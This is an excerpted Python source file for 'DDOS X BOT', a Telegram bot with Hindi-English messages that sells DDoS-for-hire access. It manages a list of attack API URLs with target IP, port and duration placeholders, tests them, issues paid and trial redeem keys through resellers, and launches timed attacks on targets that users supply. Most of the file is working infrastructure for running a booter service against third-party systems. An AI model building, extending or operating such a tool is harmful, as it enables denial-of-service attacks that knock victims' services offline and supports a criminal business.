...
print("=" * 50, flush=True)
print("🚀 Starting DDOS X BOT on Railway...", flush=True)
print(f"👑 Owner ID: {BOT_OWNER}", flush=True)
print("=" * 50, flush=True)
...
def load_apis_from_db():
    try:
        ...
        return DEFAULT_API_LIST.copy()
    except Exception as e:
        print(f"⚠️ API load error: {e}", flush=True)
        return DEFAULT_API_LIST.copy()

def save_apis_to_db(api_list):
    try:
        apis_collection.delete_many({})
        ...
        print(f"⚠️ API save error: {e}", flush=True)
        return False

def add_api_to_db(url):
    try:
        count = apis_collection.count_documents({})
        apis_collection.insert_one({
            'slot': count,
            'url': url,
            'added_at': datetime.now(),
        ...
        print(f"⚠️ API add error: {e}", flush=True)
        return False

def remove_api_from_db(index):
    try:
        docs = list(apis_collection.find().sort('slot', 1))
        if index < 0 or index >= len(docs):
            return False
        apis_collection.delete_one({'_id': docs[index]['_id']})
        remaining = list(apis_collection.find().sort('slot', 1))
        for i, doc in enumerate(remaining):
            apis_collection.update_one({'_id': doc['_id']}, {'$set': {'slot': i}})
        return True
    except Exception as e:
        print(f"⚠️ API remove error: {e}", flush=True)
        return False

def reset_apis_to_default():
    try:
        apis_collection.delete_many({})
        for i, url in enumerate(DEFAULT_API_LIST):
            apis_collection.insert_one({
        ...
        print(f"⚠️ API reset error: {e}", flush=True)
        return False

API_LIST = load_apis_from_db()
...
def track_bot_user(user_id, username=None, first_name=None):
    try:
        ...
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': update_data, '$setOnInsert': {'first_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass
...
def generate_global_status_ui():
    ...
    for idx, (attack_id, info) in enumerate(attacks[:10], 1):
        ...
        body += f"""
💢 𝗧𝗮𝗿𝗴𝗲𝘁: <code>{info['target']}:{info['port']}</code>
⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: <code>{int(remaining)}s</code> | 👤 𝗕𝘆: <code>{user_id}</code> (👤 {user_type})
...
def _set_cmd_media(cmd, message):
    ...
    if reply:
        ...
        if len(parts) < 2:
            bot.reply_to(
                message,
                f"⚠️ *Usage:*\n\n"
                f"• Kisi video/file ko reply karke: `/set{cmd}`\n"
                f"• Ya text ke liye: `/set{cmd} Your text here`",
                parse_mode="Markdown"
            )
            return
    ...
    bot.reply_to(
        ...
        f"📦 Type: `{file_type}`\n"
        f"📝 Caption: {caption[:80] if caption else 'None'}",
        parse_mode="Markdown"
    )
...
def del_setup_command(message):
    ...
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: `/delsetup <canary|ios|android>`", parse_mode="Markdown")
        return
    ...
    if r.deleted_count:
        bot.reply_to(message, f"✅ `/{cmd}` setup delete ho gaya!", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"ℹ️ `/{cmd}` pe kuch set nahi tha.", parse_mode="Markdown")
...
def add_api_command(message):
    ...
    if len(parts) < 2:
        bot.reply_to(message,
            "⚠️ *Usage:* `/addapi <url>`\n\n"
            "URL me ye placeholders hone chahiye:\n"
            "• `{ip}` — target IP\n"
            "• `{port}` — target port\n"
            "• `{duration}` — attack time\n\n"
            "Example:\n"
            "`/addapi http://1.2.3.4/attack?ip={ip}&port={port}&time={duration}&key=ABC123`",
            parse_mode="Markdown"
        )
        return
    url = parts[1].strip()
    if '{ip}' not in url or '{port}' not in url or '{duration}' not in url:
        bot.reply_to(message,
            "❌ URL me `{ip}`, `{port}`, `{duration}` — teeno hone chahiye!\n\n"
            "Example: `http://1.2.3.4/attack?ip={ip}&port={port}&time={duration}&key=ABC`",
            parse_mode="Markdown"
        )
        return
    existing = apis_collection.find_one({'url': url})
    if existing:
        bot.reply_to(message, "⚠️ Ye API pehle se list me hai!")
        return
    if add_api_to_db(url):
        reload_api_list()
        count = len(API_LIST)
        bot.reply_to(message,
            f"✅ *API Added!*\n\n"
            ...
            f"📊 Total Slots: *{count}*\n\n"
            f"Use `/listapi` to see all.",
            parse_mode="Markdown"
        )
    else:
        bot.reply_to(message, "❌ API add karne me error aaya!")
...
def remove_api_command(message):
    ...
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: `/removeapi <slot_number>`\n\nExample: `/removeapi 2`", parse_mode="Markdown")
        return
    try:
        slot_num = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid slot number!")
        return
    if slot_num < 1 or slot_num > len(API_LIST):
        bot.reply_to(message, f"❌ Slot 1 se {len(API_LIST)} ke beech hona chahiye!")
        return
    idx = slot_num - 1
    removed_url = API_LIST[idx]
    if remove_api_from_db(idx):
        reload_api_list()
        bot.reply_to(message,
            f"✅ *API Removed!*\n\n"
            f"🗑️ Slot: `{slot_num}`\n"
            f"🌐 URL: `{removed_url[:80]}{'...' if len(removed_url) > 80 else ''}`\n\n"
            f"📊 Remaining Slots: *{len(API_LIST)}*",
            parse_mode="Markdown"
        )
    else:
        bot.reply_to(message, "❌ API remove karne me error aaya!")

@bot.message_handler(commands=['listapi'])
def list_api_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    reload_api_list()
    if not API_LIST:
        bot.reply_to(message, "📋 Koi API nahi hai!\n\nUse `/addapi <url>` to add.", parse_mode="Markdown")
        return
    response = "═══════════════════════════\n🌐 𝗔𝗣𝗜 𝗟𝗜𝗦𝗧\n═══════════════════════════\n\n"
    response += f"📊 Total Slots: *{len(API_LIST)}*\n\n"
    for i, url in enumerate(API_LIST, 1):
        short = url[:60] + "..." if len(url) > 60 else url
        response += f"*{i}.* `{short}`\n\n"
    response += "═══════════════════════════\n"
    response += "Commands:\n"
    response += "• `/addapi <url>`\n"
    response += "• `/removeapi <slot>`\n"
    response += "• `/testapi <slot>`\n"
    response += "• `/testallapi`\n"
    response += "• `/resetapi`"
...
def test_api_command(message):
    ...
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: `/testapi <slot>`\n\nExample: `/testapi 1`", parse_mode="Markdown")
        return
    try:
        slot_num = int(parts[1])
    except ValueError:
    ...
    try:
        ...
        try:
            ...
            if resp_json.get('success') is True:
                ...
                status = f"⚠️ success=false: {resp_json.get('message', '')}"
        except Exception:
            status = "✅ WORKING" if resp.status_code == 200 else f"⚠️ HTTP {resp.status_code}"
        bot.edit_message_text(
            f"🧪 *Test Result — Slot {slot_num}*\n\n"
            f"📊 Status: {status}\n"
            f"⏱️ Time: {elapsed}ms\n"
        ...
        bot.edit_message_text(f"🧪 *Test Result — Slot {slot_num}*\n\n❌ ERROR: `{str(e)[:150]}`", message.chat.id, progress.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['testallapi'])
def test_all_api_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    if not API_LIST:
        bot.reply_to(message, "📋 Koi API nahi hai!")
        return
    progress = bot.reply_to(message, f"🧪 Testing all {len(API_LIST)} APIs...\n\nPlease wait...")
    results = []
    for i, url in enumerate(API_LIST, 1):
        test_url = url.format(ip="1.1.1.1", port="53", duration="1")
        try:
            ...
            try:
                resp_json = resp.json()
                if resp_json.get('success') is True:
                    results.append(f"✅ Slot {i}: WORKING ({elapsed}ms)")
                else:
                    results.append(f"⚠️ Slot {i}: success=false")
            except Exception:
                if resp.status_code == 200:
                    results.append(f"✅ Slot {i}: WORKING ({elapsed}ms)")
                else:
                    results.append(f"⚠️ Slot {i}: HTTP {resp.status_code}")
        except requests.exceptions.Timeout:
            results.append(f"❌ Slot {i}: TIMEOUT")
        except requests.exceptions.ConnectionError:
            results.append(f"❌ Slot {i}: CONN ERROR")
        except Exception as e:
            results.append(f"❌ Slot {i}: {str(e)[:30]}")
    response = "🧪 *API TEST RESULTS*\n═══════════════════════════\n\n"
    response += "\n".join(results)
    response += f"\n\n═══════════════════════════\n📊 Total: {len(API_LIST)} slots"
    try:
...
def reset_api_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    if reset_apis_to_default():
        reload_api_list()
        bot.reply_to(message,
            f"✅ *APIs Reset to Default!*\n\n"
            f"📊 Total Slots: *{len(API_LIST)}*\n\n"
            f"Use `/listapi` to see.",
            parse_mode="Markdown"
        )
    else:
        bot.reply_to(message, "❌ Reset fail ho gaya!")
    ...
    if is_owner(user_id):
        ...
        if count == 1:
            bot.reply_to(
                message,
                f"✅ <b>Key Generated!</b>\n\n"
                f"🤖 Bot: <b>DDOS X BOT</b>\n"
                f"🔑 Key: <code>/redeem {generated_keys[0]}</code>\n"
...
def settings_command(message):
    ...
    response += f"🌐 𝗔𝗣𝗜 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧\n• Total APIs: {len(API_LIST)}\n• Commands: /addapi /removeapi /listapi /testapi /testallapi /resetapi\n\n"
...
def reseller_trail_command(message):
    ...
    for reseller in resellers:
        ...
        try:
            bot.send_message(
                reseller_id,
                f"✅ <b>Trail Key Generated!</b>\n\n"
                f"🤖 Bot: <b>DDOS X BOT</b>\n"
                f"🔑 Key: <code>/redeem {key}</code>\n"
                f"⏰ Duration: {hours} hours\n"
                f"👥 Max Users: {max_users}\n\n"
                f"<i>Ye key {max_users} users use kar sakte hai.</i>\n"
                f"<i>Copy karke directly redeem kar sakte ho.</i>",
                parse_mode="HTML"
            )
            sent_count += 1
        except:
...
def owner_trail_command(message):
    ...
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /trail <duration> <max_users>\n\nExample: /trail 1d 5\n(1 key banegi jisme 5 users use kar sakte hai)")
        return
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    if not duration:
...
def redeem_key_command(message):
    ...
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        ...
        bot.reply_to(message, f"✅ Key Extended!\n\n🔑 Key: <code>{key_input}</code>\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {new_remaining}", parse_mode="HTML")
    else:
...
def handle_attack(message):
    ...
    with _attack_lock:
        ...
        if api_index is None:
            bot.reply_to(message, f"❌ Abhi chudai lgi hui hai! ({len(active_attacks)}/{len(API_LIST)})\n\n/status se check kro")
            return

        attack_id = f"{user_id}_{now.timestamp()}"
        user_cooldowns[user_id] = now + timedelta(seconds=cooldown_time + duration)
        if user_id not in user_attack_history:
            user_attack_history[user_id] = {}
        user_attack_history[user_id][f"{target}:{port}"] = now
...
🌐 API MGMT: /addapi, /removeapi, /listapi, /testapi, /testallapi, /resetapi
...
⚙️ SETUP: /setcanary, /setios, /setandroid, /setupstatus, /delsetup
...
def welcome_start(message):
    ...
    track_bot_user(user_id, username, user_name)
    ...
    try:
        ...
        print(f"⚠️ Profile photo fetch error: {e}")
...
Use /listapi for API management.'''
    elif is_reseller(user_id):
...
def run_dummy_server():
    ...
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            ...
            self.end_headers()
            self.wfile.write(b"DDOS X BOT is Running!")
...
if __name__ == "__main__":
    print("🔥 DDOS X BOT STARTING...")
    print(f"🌐 APIs Loaded: {len(API_LIST)} slots")
    for i, url in enumerate(API_LIST, 1):
        print(f"   Slot {i}: {url[:80]}")
    ...
    while True:
        try:
            ...
            print(f"⚠️ Polling crashed, restarting in 3s... Error: {e}", flush=True)
            time.sleep(3)